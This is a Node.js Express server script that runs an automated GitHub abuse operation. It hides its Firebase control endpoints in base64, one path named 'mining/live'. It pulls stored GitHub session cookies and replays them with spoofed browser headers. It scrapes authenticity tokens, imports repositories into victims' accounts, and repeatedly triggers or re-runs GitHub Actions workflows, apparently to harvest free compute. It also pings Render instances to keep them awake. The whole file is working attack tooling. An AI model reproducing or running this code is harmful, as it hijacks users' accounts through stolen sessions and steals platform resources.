const FormData = require('form-data')
const express = require('express')
const axios = require('axios')

const SERVER = 1

let mActiveServer = []
let mID = null

let mUpdate = new Date().getTime()
let mStart = parseInt(mUpdate/1000)
let mTime = new Date().toString()

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

const app = express()

app.use(express.json())

app.listen(process.env.PORT || 3010, ()=>{
    console.log('Listening on port 3000')
})

app.get('/', async (req, res) => {
    if (mID == null) {
        try {
            let url = req.query.url
            if (!url) {
                let host = req.hostname
                if (host.endsWith('onrender.com')) {
                    url = host.replace('.onrender.com', '')
                }
            }
    
            if (url && url != 'localhost') {
                mID = url
            }
        } catch (error) {}
    }

    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})


startServer()
updateServer()
createRepo()


setInterval(async () => {
    await updateStatus()
}, 60000)

setInterval(async () => {
    if (SERVER == 1) {
        await startServer()
    }
    await updateServer()
    await createRepo()
}, 300000)

async function startServer() {
    try {
        let response = await axios.get(BASE_URL+'mining/live/server.json')

        let data = response.data
        if (data != null && data != 'null') {
            await axios.get('https://'+data+'.onrender.com')
        }
    } catch (error) {}
}

async function updateStatus() {
    if (mID) {
        try {
            await axios.get('https://'+mID+'.onrender.com')       
        } catch (error) {}
    }
}

async function createRepo() {
    try {
        let response = await axios.get(BASE_URL+'github/new.json?orderBy=%22$key%22&limitToFirst=5')

        let data = response.data

        if (data != null && data != 'null') {
            let load = 0
            let devide = 200000/Object.keys(data).length

            for (let [repo, user] of Object.entries(data)) {
                importRepo(repo, user, load*devide)
                load++
            }
        }
    } catch (error) {}

    try {
        let response = await axios.get(BASE_URL+'github/start.json?orderBy=%22$key%22&limitToFirst=5')

        let data = response.data

        if (data != null && data != 'null') {
            let list = {}
            
            for (let [repo, value] of Object.entries(data)) {
                try {
                    let active = value['active']
                    if (active > 0 && active < parseInt(new Date().getTime()/1000)) {
                        list[repo] = value['user']
                    }
                } catch (error) {}
            }

            let load = 0
            let devide = 200000/Object.keys(list).length

            for (let [repo, user] of Object.entries(list)) {
                startNewAction(user, repo, load*devide)
                load++
            }
        }
    } catch (error) {}
}

async function importRepo(repo, user, timeout) {
    setTimeout(async() => {
        try {
            let response = await axios.get(BASE_URL+'github/server/'+user+'.json')
            let data = response.data

            if(data != null && data != 'null') {
                
                let form = new FormData()
                form.append('vcs_url', 'https://github.com/'+user+'/'+user)
                form.append('owner', user)
                form.append('repository[name]', repo)
                form.append('repository[visibility]', 'public')
                form.append('source_username', '')
                form.append('source_access_token', '')

                response = await axios.post('https://github.com/new/import', form, {
                    headers: {
                        'accept': 'text/html',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': form.getHeaders()['content-type'],
                        'cookie': 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;',
                        'github-verified-fetch': 'true',
                        'origin': 'https://github.com',
                        'priority': 'u=1, i',
                        'referer': 'https://github.com/new/import',
                        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                        'x-requested-with': 'XMLHttpRequest'
                    },
                    maxRedirects: 0,
                    validateStatus: null
                })
                
                try {
                    let active = 0

                    if (response.status == 302 || response.data == '') {
                        active = parseInt(new Date().getTime()/1000)+200
                    }

                    await axios.patch(BASE_URL+'github/start/'+repo+'.json', JSON.stringify({ user:user, active:active }), {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
                } catch (error) {}
                
                await axios.delete(BASE_URL+'github/new/'+repo+'.json')
            }
        } catch (error) {}
    }, timeout)
}

async function startNewAction(user, repo, timeout) {
    setTimeout(async() => {
        try {
            let response = await axios.get(BASE_URL+'github/server/'+user+'.json')
            let data = response.data

            if(data != null && data != 'null') {
                let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;'
                
                await newAction(user, repo, cookies)
                let action = await getAction(user, repo, cookies)
                
                if (action) {
                    console.log('Receive New Action: '+action)
                    console.log('Success: '+repo)
                    await saveAction(user, repo, action)

                    await axios.patch(BASE_URL+'github/panding/.json', '{"'+repo+'":"1"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })

                    await axios.delete(BASE_URL+'github/start/'+repo+'.json')
                } else {
                    console.log('Action Null: '+user)
                }
            }
        } catch (error) {}
    }, timeout)
}

async function updateServer() {
    try {
        if (mActiveServer.length == 0 || mUpdate < new Date().getTime()) {
            let response = await axios.get(BASE_URL+'github/update/'+getServerName(SERVER)+'.json')

            try {
                let temp = []

                for(let key of Object.keys(response.data)) {
                    if (key != null) {
                        temp.push(key)
                    }
                }

                mActiveServer = temp
                mUpdate = new Date().getTime()+3600000
            } catch (error) {}
        }
        
        let size = mActiveServer.length

        console.log('All: '+size+' Update: '+new Date().toString())

        if (size > 0) {
            let devide = 250000/size

            for (let i = 0; i < size; i++) {
                updateWebsite(mActiveServer[i], i*devide)
                break
            }
        }

        if (size < 100) {
            try {
                let response = await axios.get(BASE_URL+'github/panding.json?orderBy=%22$key%22&limitToFirst='+(100-size))

                let data = response.data

                if (data != null && data != 'null') {
                    
                    for (let key of Object.keys(data)) {
                        try {
                            await axios.patch(BASE_URL+'github/update/'+getServerName(SERVER)+'.json', '{"'+key+'":"1"}', {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            })

                            await axios.delete(BASE_URL+'github/panding/'+key+'.json')
                        } catch (error) {}

                        mUpdate = new Date().getTime()
                    }
                }
            } catch (error) {}
        }
    } catch (error) {
        console.log(error)
    }
}
   
async function updateWebsite(repo, timeout) {
    setTimeout(async() => {
        try {
            let storageUrl = STORAGE+encodeURIComponent('server/'+repo+'.json')
            let response = await axios.get(storageUrl)
            
            if (parseInt(new Date().getTime()/1000) > parseInt(response.data['contentType'].replace('active/', ''))+10) {
                response = await axios.get(BASE_URL+'github/action/'+repo+'.json')
                
                let data = response.data

                if(data != null && data != 'null') {
                    let action = data['action']
                    let user = data['user']

                    response = await axios.get(BASE_URL+'github/server/'+user+'.json')
                
                    data = response.data

                    if(data != null && data != 'null') {
                        let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;'
            
                        let cancel = await activeAction(user, repo, action, storageUrl, cookies)
            
                        if (cancel) {
                            await delay(15000)
                            await activeAction(user, repo, data['action'], storageUrl, cookies)
                        }
                    } else {
                        console.log('Data Not Found')
                        await axios.delete(storageUrl)
                    }
                } else {
                    console.log('Data Not Found')
                    await axios.delete(storageUrl)
                }
            }
        } catch (error) {}
    }, timeout)
}

async function activeAction(user, repo, action, storageUrl, cookies) {
    let token = null

    try {
        let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions/runs/'+action, { 
            headers: getFrameHeader(cookies),
            maxRedirects: 0,
            validateStatus: null
        })

        let body = response.data

        if (body.includes('hx_dot-fill-pending-icon') && body.includes('class="d-inline-block"')) {
            try {
                await axios.get('https://raw.githubusercontent.com/'+user+'/'+repo+'/main/.github/workflows/main.yml')
            } catch (error) {
                try {
                    if (error.response.data == '404: Not Found') {
                        next = false
                        await axios.delete(storageUrl)
                    }
                } catch (error) {}
            }

            if (next) {
                body = body.substring(body.indexOf('class="d-inline-block"'), body.length)
                let form = body.substring(0, body.indexOf('</form>'))
                let url = form.substring(form.indexOf('action'), form.length)
                url = url.substring(url.indexOf('"')+1, url.length)
                url = url.substring(0, url.indexOf('"'))
                let auth = form.substring(form.indexOf('authenticity_token'), form.length)
                auth = auth.substring(auth.indexOf('value'), auth.length)
                auth = auth.substring(auth.indexOf('"')+1, auth.length)
                auth = auth.substring(0, auth.indexOf('"'))

                if (url && auth && auth.length > 10) {
                    await axios.post('https://github.com'+url,
                        new URLSearchParams({
                        '_method': 'put',
                        'authenticity_token': auth
                        }),
                        {
                            headers: getGrapHeader(cookies),
                            maxRedirects: 0,
                            validateStatus: null,
                        })

                    return true
                }
            }
        } else {
            if (body.includes('Failure') || body.includes('Cancelled') || body.includes('Success')) {
                if (body.includes('rerequest_check_suite') && body.includes('id="rerun-dialog-mobile-all"')) {
                    body = body.substring(body.indexOf('id="rerun-dialog-mobile-all"'), body.length)
                    body = body.substring(0, body.indexOf('</dialog>'))
                    body = body.substring(body.indexOf('rerequest_check_suite'), body.length)
                    
                    let name = 'name="authenticity_token"'
                    if (body.includes(name)) {
                        let index = body.indexOf(name)+name.length
                        let _token = body.substring(index, index+200).split('"')[1]
                        if (_token && _token.length > 10) {
                            token = _token
                        }
                    }
                } else {
                    if (!body.includes('aria-label="currently running: "') && body.includes('Jump to attempt')) {
                        await newAction(user, repo, cookies)
                        let action = await getAction(user, repo, cookies)
                        if (action) {
                            token = 'action'
                            console.log('Receive New Action: '+action)
                            console.log('Success: '+user)
                            await saveAction(user, repo, action)
                        } else {
                            console.log('Action Null: '+user)
                        }
                    }
                }
            }

            if (token && token != 'action') {
                let response = await axios.post('https://github.com/'+user+'/'+repo+'/actions/runs/'+action+'/rerequest_check_suite',
                    new URLSearchParams({
                        '_method': 'put',
                        'authenticity_token': token
                    }),
                {
                    headers: getGrapHeader(cookies),
                    maxRedirects: 0,
                    validateStatus: null,
                })
        
                try {
                    if (response.data.length > 0) {
                        console.log('Block: '+user)
                    } else {
                        console.log('Success: '+user)
                    }
        
                    await axios.post(storageUrl, '', {
                        headers: {
                            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
                        },
                        maxBodyLength: Infinity,
                        maxContentLength: Infinity
                    })
                } catch (error) {
                    console.log('Error: '+user)
                }
            }
        }
    } catch (error) {}

    if (token == null) {
        console.log('Token Null: '+user)

        try {
            await axios.get('https://raw.githubusercontent.com/'+user+'/'+repo+'/main/.github/workflows/main.yml')
        } catch (error) {
            try {
                if (error.response.data == '404: Not Found') {
                    console.log('remove')
                    await axios.delete(storageUrl)
                }
            } catch (error) {}
        }
    }

    return false
}

async function newAction(user, repo, cookies) {
    let token = null

    try {
        let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions/manual?workflow=.github%2Fworkflows%2Fmain.yml', { 
            headers: getFrameHeader(cookies),
            maxRedirects: 0,
            validateStatus: null
        })

        let body = response.data

        let name = 'name="authenticity_token"'
        if (body.includes(name)) {
            let index = body.indexOf(name)+name.length
            let _token = body.substring(index, index+200).split('"')[1]
            if (_token && _token.length > 10) {
                token = _token
            }
        }

        if (token) {
            await axios.post('https://github.com/'+user+'/'+repo+'/actions/manual',
                new URLSearchParams({
                    'authenticity_token': token,
                    'workflow': '.github/workflows/main.yml',
                    'branch': 'main',
                    'show_workflow_tip': ''
                }),
                {
                    headers: getGrapHeader(cookies),
                    maxRedirects: 0,
                    validateStatus: null,
                })
            
            await delay(3000)
        }
    } catch (error) {}
}

async function getAction(user, repo, cookies) {
    let action = null

    for (let i = 0; i < 5; i++) {
        try {
            let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions', { 
                headers: getFrameHeader(cookies),
                maxRedirects: 0,
                validateStatus: null
            })

            let body = response.data

            let name = 'aria-label="currently running: "'
            if (body.includes(name)) {
                let temp = body.substring(0, body.indexOf(name))
                temp = temp.substring(temp.lastIndexOf('Box-row js-socket-channel js-updatable-content'))
                temp = temp.substring(temp.indexOf('/actions/runs/'))
                action = temp.substring(14, temp.indexOf('"'))
            }
        } catch (error) {}

        if (action) {
            break
        }

        await delay(2000)
    }

    return action
}

async function saveAction(user, repo, action) {
    try {
        await axios.patch(BASE_URL+'github/action/'+repo+'.json', JSON.stringify({ action:action, user:user }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function getFrameHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookies,
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'turbo-frame': 'repo-content-turbo-frame',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function getGrapHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookies,
        'origin': 'https://github.com',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function getServerName(id) {
    if (id < 10) {
        return 'server0'+id
    }
    return 'server'+id
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
